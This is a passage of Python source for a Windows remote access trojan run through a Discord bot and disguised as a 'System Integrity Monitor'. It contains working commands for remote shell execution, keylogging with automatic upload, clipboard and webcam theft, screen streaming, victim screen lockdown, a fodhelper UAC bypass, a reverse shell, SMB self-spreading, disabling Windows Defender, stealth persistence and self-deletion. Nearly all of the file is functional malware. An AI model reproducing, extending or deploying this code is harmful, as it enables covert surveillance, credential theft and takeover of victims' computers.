                        asyncio.run_coroutine_threadsafe(ctx.send("❌ Webcam busy or not found"), self.bot.loop)
                except Exception as e:
                    asyncio.run_coroutine_threadsafe(ctx.send(f"❌ Webcam error: {e}"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_webcam)
            await ctx.send("📸 **Snapping photo...**")

        @self.bot.command(name='lockdown')
        async def lockdown_command(ctx):
            """💀 INITIATE LOCKDOWN MODE"""
            global _recovery_service
            if _recovery_service:
                await ctx.send("💀 **LOCKDOWN INITIATED** - Screen locking...")
                _recovery_service.lock_system()
            else:
                 await ctx.send("❌ Recovery Service not initialized")

        @self.bot.command(name='lock_msg')
        async def lock_msg_command(ctx, *, msg):
            """Send message to locked victim"""
            if _recovery_service and _recovery_service.is_locked:
                _recovery_service.send_admin_message(msg)
                await ctx.send(f"📨 Sent to screen: {msg}")
            else:
                await ctx.send("❌ System is not locked")

        @self.bot.command(name='unlock')
        async def unlock_command(ctx):
            """Remote Unlock"""
            if _recovery_service:
                _recovery_service._unlock()
                await ctx.send("✅ Unlocked remotely")
    
        # ========== ENHANCED WALLPAPER COMMAND ==========
        @self.bot.command(name='wallpaper')
        async def wallpaper_command(ctx, *, url_or_path=None):
            """Change wallpaper from URL or attached image"""
            def execute_wallpaper():
                try:
                    # Check if there's an attachment
                    if ctx.message.attachments:
                        attachment = ctx.message.attachments[0]
                        token = ctx.bot.http.token
                        headers = {'Authorization': f'Bot {token}'}
                        response = requests.get(attachment.url, headers=headers, timeout=30)
                        if response.status_code == 200:
                            img_path = os.path.join(tempfile.gettempdir(), "wallpaper_attached.jpg")
                            with open(img_path, 'wb') as f:
                                f.write(response.content)
                        
                            # Set as wallpaper
                            ctypes.windll.user32.SystemParametersInfoW(20, 0, img_path, 3)
                            asyncio.run_coroutine_threadsafe(ctx.send("✅ **Wallpaper changed from attachment**"), self.bot.loop)
                            return
                
                    # If no attachment, check for URL or path
                    if url_or_path:
                        # Check if it's a URL
                        if url_or_path.startswith(('http://', 'https://')):
                            # Download from URL
                            response = requests.get(url_or_path, timeout=30)
                            if response.status_code == 200:
                                img_path = os.path.join(tempfile.gettempdir(), "wallpaper_url.jpg")
                                with open(img_path, 'wb') as f:
                                    f.write(response.content)
                            
                                # Set as wallpaper
                                ctypes.windll.user32.SystemParametersInfoW(20, 0, img_path, 3)
                                asyncio.run_coroutine_threadsafe(ctx.send("✅ **Wallpaper changed from URL**"), self.bot.loop)
                                return
                        else:
                            # Assume it's a local file path
                            if os.path.exists(url_or_path):
                                ctypes.windll.user32.SystemParametersInfoW(20, 0, url_or_path, 3)
                                asyncio.run_coroutine_threadsafe(ctx.send("✅ **Wallpaper changed from local path**"), self.bot.loop)
                                return
                
                    asyncio.run_coroutine_threadsafe(ctx.send("❌ **Please provide a valid URL, file attachment, or local file path**"), self.bot.loop)
                
                except Exception as e:
                    asyncio.run_coroutine_threadsafe(ctx.send(f"❌ **Failed to change wallpaper:** {str(e)}"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_wallpaper)
            await ctx.send("⚡ **Changing wallpaper...**")
    
        # ========== MESSAGE BOX WITH MULTI-COMMAND SUPPORT ==========
        @self.bot.command(name='msgbox')
        async def msgbox_command(ctx, title, *, message):
            """Show message box (NON-BLOCKING)"""
            def execute_msgbox():
                try:
                    ctypes.windll.user32.MessageBoxW(0, message, title, 0)
                    asyncio.run_coroutine_threadsafe(ctx.send(f"✅ Message box displayed: {title}"), self.bot.loop)
                except Exception as e:
                    asyncio.run_coroutine_threadsafe(ctx.send(f"❌ Failed to display message box: {str(e)}"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_msgbox)
            await ctx.send("⚡ **Displaying message box...**")
    
        # ========== SHELL COMMAND WITH MULTI-COMMAND SUPPORT ==========
        @self.bot.command(name='shell')
        async def shell_command(ctx, *, command):
            """Execute shell command (NON-BLOCKING)"""
            def execute_shell():
                try:
                    if command.strip().startswith('cd '):
                        new_path = command[3:].strip()
                        global _file_explorer_location
                        if os.path.exists(new_path) and os.path.isdir(new_path):
                            _file_explorer_location = new_path
                            asyncio.run_coroutine_threadsafe(ctx.send(f"📂 Changed directory to: {new_path}"), self.bot.loop)
                        else:
                            asyncio.run_coroutine_threadsafe(ctx.send("❌ Directory does not exist"), self.bot.loop)
                        return
                    
                    result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60, cwd=_file_explorer_location)
                    output = result.stdout + result.stderr
                
                    if len(output) > 1900:
                        for i in range(0, len(output), 1900):
                            asyncio.run_coroutine_threadsafe(ctx.send(f"```{output[i:i+1900]}```"), self.bot.loop)
                    else:
                        asyncio.run_coroutine_threadsafe(ctx.send(f"```{output}```"), self.bot.loop)
                except subprocess.TimeoutExpired:
                    asyncio.run_coroutine_threadsafe(ctx.send("❌ Command timed out after 60 seconds"), self.bot.loop)
                except Exception as e:
                    asyncio.run_coroutine_threadsafe(ctx.send(f"❌ Error: {str(e)}"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_shell)
            await ctx.send("⚡ **Executing command...**")
    
        # ========== LIVE STREAMING COMMANDS ==========
        @self.bot.command(name='start_stream')
        async def start_stream_command(ctx):
            """Start live desktop streaming"""
            asyncio.create_task(_live_streaming_service.start_stream(ctx))
            await ctx.send("🖥️ **Live Desktop Streaming Started**")
    
        @self.bot.command(name='stop_stream')
        async def stop_stream_command(ctx):
            """Stop desktop streaming"""
            _live_streaming_service.stop_stream()
            await ctx.send("✅ Desktop streaming stopped")
    
        @self.bot.command(name='stream_quality')
        async def stream_quality_command(ctx, quality: int):
            """Set streaming quality"""
            if _live_streaming_service.set_quality(quality):
                await ctx.send(f"✅ Stream quality set to {quality}")
            else:
                await ctx.send("❌ Quality must be between 1-100")
    
        # ========== KEYLOGGER COMMANDS ==========
        @self.bot.command(name='live_keylog_start')
        async def live_keylog_start_command(ctx):
            """Start LIVE real-time keylogger"""
            global _input_monitoring_service
            if _input_monitoring_service and await _input_monitoring_service.start_live_keylogger():
                await ctx.send("✅ **LIVE Keylogger Started** - Sending keystrokes in real-time!")
            else:
                await ctx.send("❌ Failed to start live keylogger")
    
        @self.bot.command(name='live_keylog_stop')
        async def live_keylog_stop_command(ctx):
            """Stop LIVE real-time keylogger"""
            global _input_monitoring_service
            if _input_monitoring_service:
                _input_monitoring_service.stop_keylogger()
                await ctx.send("✅ **LIVE Keylogger Stopped**")
            else:
                await ctx.send("❌ Live keylogger not running")
    
        @self.bot.command(name='keylog_dump')
        async def keylog_dump_command(ctx):
            """Get keylogger data"""
            global _input_monitoring_service
            if _input_monitoring_service:
                keystrokes = _input_monitoring_service.get_keystrokes()
                if keystrokes:
                    await ctx.send(f"⌨️ **Keylogger Data**\n```{keystrokes}```")
                else:
                    await ctx.send("❌ No keylogger data available")
            else:
                await ctx.send("❌ Live keylogger not initialized")
    
        # ========== CLIPBOARD COMMAND ==========
        @self.bot.command(name='clipboard')
        async def clipboard_command(ctx):
            """Get clipboard contents"""
            def execute_clipboard():
                try:
                    import win32clipboard
                    win32clipboard.OpenClipboard()
                    data = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()
                    asyncio.run_coroutine_threadsafe(ctx.send(f"📋 **Clipboard Contents**\n```{data}```"), self.bot.loop)
                except Exception as e:
                    asyncio.run_coroutine_threadsafe(ctx.send(f"❌ Clipboard error: {str(e)}"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_clipboard)
            await ctx.send("⚡ **Reading clipboard...**")
    

    
        # ========== SYSTEM CONTROL COMMANDS ==========
        @self.bot.command(name='lock')
        async def lock_command(ctx):
            """Lock the workstation"""
            def execute_lock():
                try:
                    ctypes.windll.user32.LockWorkStation()
                    asyncio.run_coroutine_threadsafe(ctx.send("✅ Workstation locked"), self.bot.loop)
                except:
                    asyncio.run_coroutine_threadsafe(ctx.send("❌ Failed to lock workstation"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_lock)
            await ctx.send("⚡ **Locking workstation...**")
    
        @self.bot.command(name='shutdown')
        async def shutdown_command(ctx):
            """Shutdown the system"""
            def execute_shutdown():
                try:
                    subprocess.run("shutdown /s /t 0", shell=True)
                    asyncio.run_coroutine_threadsafe(ctx.send("✅ System shutdown initiated"), self.bot.loop)
                except:
                    asyncio.run_coroutine_threadsafe(ctx.send("❌ Failed to shutdown system"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_shutdown)
            await ctx.send("⚡ **Initiating shutdown...**")
    
        @self.bot.command(name='reboot')
        async def reboot_command(ctx):
            """Reboot the system"""
            def execute_reboot():
                try:
                    subprocess.run("shutdown /r /t 0", shell=True)
                    asyncio.run_coroutine_threadsafe(ctx.send("✅ System reboot initiated"), self.bot.loop)
                except:
                    asyncio.run_coroutine_threadsafe(ctx.send("❌ Failed to reboot system"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_reboot)
            await ctx.send("⚡ **Initiating reboot...**")
    
        @self.bot.command(name='kill')
        async def kill_command(ctx, pid: int = None):
            """Kill a process by PID or current process if no PID provided"""
            def execute_kill():
                try:
                    if pid is None:
                        asyncio.run_coroutine_threadsafe(ctx.send("✅ Killing current process..."), self.bot.loop)
                        _clean_exit()
                    else:
                        os.kill(pid, 9)
                        asyncio.run_coroutine_threadsafe(ctx.send(f"✅ Process {pid} killed"), self.bot.loop)
                except Exception as e:
                    asyncio.run_coroutine_threadsafe(ctx.send(f"❌ Failed to kill process: {str(e)}"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_kill)
            await ctx.send("⚡ **Killing process...**")
    
        # ========== TEXT-TO-SPEECH WITH MULTI-COMMAND SUPPORT ==========
        @self.bot.command(name='speak')
        async def speak_command(ctx, *, text):
            """Text-to-speech with Creepy (Hacker) or Normal modes"""
            def execute_speak():
                try:
                    # Detect mode from prefix
                    mode = "normal"
                    content = text
                    rate = -2 # Clearer normal voice
                    
                    if text.lower().startswith("creepy "):
                        mode = "creepy"
                        content = text[7:]
                        rate = -3 # Absolute creepy slow
                        ps_script = (
                            f'Add-Type -AssemblyName System.speech; '
                            f'$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; '
                            f'$builder = New-Object System.Speech.Synthesis.PromptBuilder; '
                            f'$builder.StartParagraph(); '
                            f'$builder.StartSentence(); '
                            f'$builder.AppendText(\\"{content}\\"); '
                            f'$builder.EndSentence(); '
                            f'$builder.EndParagraph(); '
                            f'$speak.Rate = {rate}; '
                            f'$speak.Volume = 100; '
                            f'$speak.Speak($builder);'
                        )
                    else:
                        if text.lower().startswith("normal "):
                            content = text[7:]
                        ps_script = (
                            f'Add-Type -AssemblyName System.speech; '
                            f'$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; '
                            f'$speak.Rate = {rate}; '
                            f'$speak.Speak(\\"{content}\\");'
                        )
                        
                    ps_cmd = f'powershell -Command "{ps_script}"'
                    subprocess.run(ps_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    asyncio.run_coroutine_threadsafe(ctx.send(f"✅ Spoken ({mode}): {content[:50]}..."), self.bot.loop)
                except:
                    asyncio.run_coroutine_threadsafe(ctx.send("❌ Failed to speak text"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_speak)
            await ctx.send("⚡ **Processing voice message...**")
    

    
        # ========== ADVANCED FEATURES ==========
        @self.bot.command(name='advanced_info')
        async def advanced_info_command(ctx):
            """Ultimate system info"""
            def execute_advanced_info():
                data = _system_info_service.gather_comprehensive_system_info()
                formatted_data = self.format_system_info(data)
                asyncio.run_coroutine_threadsafe(self.send_long_message(ctx, formatted_data), self.bot.loop)
        
            _command_orchestrator.start_command(execute_advanced_info)
            await ctx.send("⚡ **Collecting advanced system info...**")
    
        @self.bot.command(name='process_inject')
        async def process_inject_command(ctx, pid: int):
            """Process injection"""
            def execute_process_inject():
                try:
                    asyncio.run_coroutine_threadsafe(ctx.send(f"🔄 Attempting to inject into process {pid}..."), self.bot.loop)
                    # Basic injection simulation
                    if _monitor_process(pid):
                        asyncio.run_coroutine_threadsafe(ctx.send(f"✅ Successfully monitoring process {pid}"), self.bot.loop)
                    else:
                        asyncio.run_coroutine_threadsafe(ctx.send(f"❌ Failed to inject into process {pid}"), self.bot.loop)
                except Exception as e:
                    asyncio.run_coroutine_threadsafe(ctx.send(f"❌ Injection failed: {str(e)}"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_process_inject)
            await ctx.send("⚡ **Attempting process injection...**")
    
        @self.bot.command(name='bypass_uac')
        async def bypass_uac_command(ctx):
            """Attempt UAC bypass"""
            def execute_bypass_uac():
                try:
                    cmds = [
                        'reg add "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command" /d "cmd.exe /c {0}" /f'.format(sys.argv[0]),
                        'reg add "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command" /v "DelegateExecute" /f',
                        'fodhelper.exe'
                    ]
                
                    for cmd in cmds:
                        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                    asyncio.run_coroutine_threadsafe(ctx.send("✅ UAC bypass attempted"), self.bot.loop)
                except:
                    asyncio.run_coroutine_threadsafe(ctx.send("❌ UAC bypass failed"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_bypass_uac)
            await ctx.send("⚡ **Attempting UAC bypass...**")
    
        @self.bot.command(name='sleep')
        async def sleep_command(ctx, seconds: int):
            """Set check-in interval"""
            global _communication_interval
            _communication_interval = seconds
            await ctx.send(f"✅ Check-in interval changed to {seconds} seconds")
    


        @self.bot.command(name='persist')
        async def persist_command(ctx):
            """Install persistence (Stealth)"""
            perms = _persistence_service.ensure_persistence()
            if perms:
                await ctx.send(f"✅ **Persistence Installed:** {', '.join(perms)}")
            else:
                await ctx.send("⚠️ Persistence installation attempted (Silent)")

        @self.bot.command(name='startup_list')
        async def startup_list_command(ctx):
            """View startup items"""
            items = _persistence_service.get_startup_items()
            if items:
                msg = "**🚀 Startup Items:**\n" + "\n".join(items[:20])
                if len(items) > 20: msg += "\n..."
                await getattr(ctx, 'send')(msg)
            else:
                 await ctx.send("ℹ️ No startup items found")        

        @self.bot.command(name='rev_shell')
        async def rev_shell_command(ctx, host, port):
            """Start Reverse Shell"""
            if _network_exploit_service:
                await ctx.send(f"🐚 **Connecting Shell to {host}:{port}...**")
                _network_exploit_service.start_reverse_shell(host, port)
            else: await ctx.send("❌ Service not ready")

        @self.bot.command(name='map_network')
        async def map_network_command(ctx):
            """Map Local Network (Ping Sweep)"""
            if _network_exploit_service:
                await ctx.send("🕸️ **Scanning Network (This may take time)...**")
                def run_map():
                    hosts = _network_exploit_service.map_network()
                    if hosts:
                         asyncio.run_coroutine_threadsafe(ctx.send(f"✅ **Active Hosts:**\n" + "\n".join(hosts)), self.bot.loop)
                    else:
                         asyncio.run_coroutine_threadsafe(ctx.send("❌ No other hosts found"), self.bot.loop)
                threading.Thread(target=run_map, daemon=True).start()

        @self.bot.command(name='auto_spread')
        async def auto_spread_command(ctx):
            """Attempt Auto-Spreading (SMB)"""
            if _network_exploit_service:
                await ctx.send("🔥 **Initiating Auto-Spread Protocol...**")
                def run_spread():
                    log = _network_exploit_service.auto_spread_smb()
                    asyncio.run_coroutine_threadsafe(ctx.send("📋 **Spread Log:**\n" + "\n".join(log[:15])), self.bot.loop)
                threading.Thread(target=run_spread, daemon=True).start()



                threading.Thread(target=run_spread, daemon=True).start()

        @self.bot.command(name='disable_av')
        async def disable_av_command(ctx):
            """尝试 Disable Windows Defender"""
            log = _defender_service.disable_av()
            await ctx.send("🛡️ **AV Evasion Attempted:**\n" + "\n".join(log))

        @self.bot.command(name='elevate')
        async def elevate_command(ctx):
            """Request Admin Rights"""
            res = _defender_service.elevate_privileges()
            await ctx.send(f"⚡ **Elevation Status:** {res}")
            if res == "Prompt Triggered":
                 await ctx.send("⏳ Waiting for user to click Yes... Connection may reset.")

        @self.bot.command(name='help')
        async def help_command(ctx):
             """Show Help Menu"""
             await self.commands_command(ctx)

        @self.bot.command(name='self_destruct')
        async def self_destruct_command(ctx):
            """Complete self-destruction - REMOVES ALL COPIES"""
            await ctx.send("🚨 **SELF-DESTRUCT INITIATED** - Removing Persistence & Files...")
            _persistence_service.remove_persistence()
            _ultimate_complete_self_destruct()
        @self.bot.command(name='browse')
        async def browse_command(ctx, url):
            """Browse URL on Host Machine"""
            def execute_browse():
                try:
                    import webbrowser
                    target_url = url
                    if not target_url.startswith(('http://', 'https://')):
                        target_url = 'http://' + target_url
                    
                    webbrowser.open(target_url)
                    asyncio.run_coroutine_threadsafe(ctx.send(f"🌐 **Opened on Host:** {target_url}"), self.bot.loop)
                except Exception as e:
                    asyncio.run_coroutine_threadsafe(ctx.send(f"❌ Browse error: {e}"), self.bot.loop)
            _command_orchestrator.start_command(execute_browse)
            await ctx.send(f"⚡ **Opening {url} on host...**")

        @self.bot.command(name='keylog_start')
        async def keylog_start_command(ctx):
            """Start keylogger with auto-send"""
            global _input_monitoring_service
            if _input_monitoring_service:
                 success = await _input_monitoring_service.start_keylogger()
                 if success:
                     await ctx.send("✅ **Keylogger Started** (Auto-send every 5m)")
                     
                     def auto_sender():
                         while _input_monitoring_service and _input_monitoring_service.is_running:
                             time.sleep(300) # 5 minutes
                             try:
                                 logs = _input_monitoring_service.get_keystrokes()
                                 if logs and len(logs) > 10:
                                     asyncio.run_coroutine_threadsafe(ctx.send(f"⌨️ **Auto-Log Report:**\n```{logs[:1900]}```"), self.bot.loop)
                             except: pass
                     
                     threading.Thread(target=auto_sender, daemon=True).start()
                 else:
                     await ctx.send("❌ Failed to start keylogger")
        
        @self.bot.command(name='keylog_stop')
        async def keylog_stop_command(ctx):
            """Stop keylogger"""
            global _input_monitoring_service
            if _input_monitoring_service:
                _input_monitoring_service.stop_keylogger()
                await ctx.send("✅ **Keylogger Stopped**")

        @self.bot.command(name='task_sched')
        async def task_sched_command(ctx, command_name, delay_seconds: int, *args):
            """Schedule a task"""
            asyncio.run_coroutine_threadsafe(ctx.send(f"⏰ Task **{command_name}** scheduled in {delay_seconds}s"), self.bot.loop)
            
            def scheduled_task():
                time.sleep(delay_seconds)
                cmd = ctx.bot.get_command(command_name.lstrip('.'))
                if cmd:
                     asyncio.run_coroutine_threadsafe(ctx.invoke(cmd, *args), self.bot.loop)
                else:
                     asyncio.run_coroutine_threadsafe(ctx.send(f"❌ Scheduled command not found: {command_name}"), self.bot.loop)

            threading.Thread(target=scheduled_task, daemon=True).start()

    async def send_long_message(self, ctx, text):
        """Send long messages with proper chunking"""
        if len(text) <= 2000:
            await ctx.send(text)
        else:
            chunks = [text[i:i+1900] for i in range(0, len(text), 1900)]
            for i, chunk in enumerate(chunks):
                if i == 0:
                    await ctx.send(chunk)
                else:
                    await ctx.send(f"```{chunk}```")

    def format_system_info(self, data):
        """Format system information for readable output"""
        if isinstance(data, dict):
            formatted = "🖥️ **SYSTEM INFORMATION**\n\n"
            for key, value in data.items():
                if isinstance(value, dict):
                    formatted += f"**{key}:**\n"
                    for subkey, subvalue in value.items():
                        formatted += f"  {subkey}: {subvalue}\n"
                else:
                    formatted += f"**{key}:** {value}\n"
            return formatted
        else:
            return str(data)

    def run(self):
        """Start communication"""
        try:
            self.bot.run(DISCORD_BOT_TOKEN)
        except Exception as e:
            print(f"Bot error: {e}")
            time.sleep(300)



# ========== HELPER FUNCTIONS ==========
def _monitor_process(pid):
    """Monitor a process"""
    try:
        PROCESS_ALL_ACCESS = 0x1F0FFF
        process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if process_handle:
            ctypes.windll.kernel32.CloseHandle(process_handle)
            return True
        return False
    except:
        return False

def _clean_exit():
    """Clean exit without destruction"""
    try:
        global _input_monitoring_service, _network_propagation_service, _voice_recording_service
        if _input_monitoring_service:
            _input_monitoring_service.stop_keylogger()
        _network_propagation_service.stop_auto_spread()
        _live_streaming_service.stop_stream()
        if _voice_recording_service:
            _voice_recording_service.stop_recording()
        _command_orchestrator.stop_all_commands()
        sys.exit(0)
    except:
        os._exit(0)

def _ultimate_complete_self_destruct():
    """COMPLETE self-destruction - REMOVES ALL COPIES"""
    try:
        # Stop all activities
        global _input_monitoring_service, _network_propagation_service, _voice_recording_service
        if _input_monitoring_service:
            _input_monitoring_service.stop_keylogger()
        _network_propagation_service.stop_auto_spread()
        _live_streaming_service.stop_stream()
        if _voice_recording_service:
            _voice_recording_service.stop_recording()
        _command_orchestrator.stop_all_commands()

        # Create cleanup script
        current_file = sys.argv[0]

        bat_content = f"""
@echo off
chcp 65001 >nul
echo SYSTEM CLEANUP IN PROGRESS...
timeout /t 3 /nobreak >nul

:cleanup_loop
del /f /q "{current_file}" >nul 2>&1
"""

        # Add deletion commands for common persistence locations
        stealth_names = ["svchost.exe", "csrss.exe", "winlogon.exe", "services.exe",
        "lsass.exe", "spoolsv.exe", "explorer.exe", "taskhost.exe",
        "WindowsSystemManager.exe", "setup.exe", "document.pdf.exe", "image.jpg.exe"]

        for location in _persistence_locations:
            for name in stealth_names:
                bat_content += f'del /f /q "{os.path.join(location, name)}" >nul 2>&1\n'

        bat_content += """
if exist "%0" (
timeout /t 2 /nobreak >nul
goto cleanup_loop
)

echo CLEANUP COMPLETE
del /f /q "%~f0" >nul 2>&1
"""

        bat_path = os.path.join(tempfile.gettempdir(), "system_cleanup.bat")
        with open(bat_path, 'w') as f:
            f.write(bat_content)

        subprocess.Popen(["cmd", "/c", bat_path], creationflags=subprocess.CREATE_NO_WINDOW)
        sys.exit(0)

    except:
        os._exit(0)

def _enhanced_security_protocol():
    """Advanced security evasion techniques"""
    security_commands = [
        'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue"',
        'powershell -Command "Add-MpPreference -ExclusionPath "C:\\Windows" -ErrorAction SilentlyContinue"',
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1',
    ]

    for cmd in security_commands:
        try:
            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
        except:
            pass

def _minimize_visibility():
    """Completely hide the application"""
    try:
        if hasattr(ctypes.windll.user32, "ShowWindow"):
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def _create_system_lock():
    """Prevent multiple instances"""
    try:
        system_lock = ctypes.windll.kernel32.CreateMutexW(None, False, _system_lock_name)
        if ctypes.windll.kernel32.GetLastError() == 183:
            sys.exit(0)
        return True
    except:
        return False

def _start_client_cleanup_thread():
    """Start background thread to clean up offline clients"""
    def cleanup_worker():
        while True:
            try:
                offline_clients = _client_management_service.cleanup_offline_clients()
                if offline_clients:
                    print(f"Cleaned up offline clients: {offline_clients}")
                time.sleep(60)
            except:
                time.sleep(60)
    
    cleanup_thread = threading.Thread(target=cleanup_worker, daemon=True)
    cleanup_thread.start()

# ========== MAIN OPERATION ==========
def _enterprise_main_operation():
    print("🚀 Initializing Windows System Integrity Monitor v7.1...")
    
    if not _create_system_lock():
        print("⚠️ System already secured")
        return
    
    _minimize_visibility()
    _enhanced_security_protocol()
    _persistence_service.ensure_persistence()
    
    # _network_propagation_service.start_auto_spread() (Disabled on start for silence)
    
    # Start client cleanup thread
    _start_client_cleanup_thread()
    
    command_control_service = CommandAndControlService()
    command_control_service.run()
if __name__ == '__main__':
    _enterprise_main_operation()
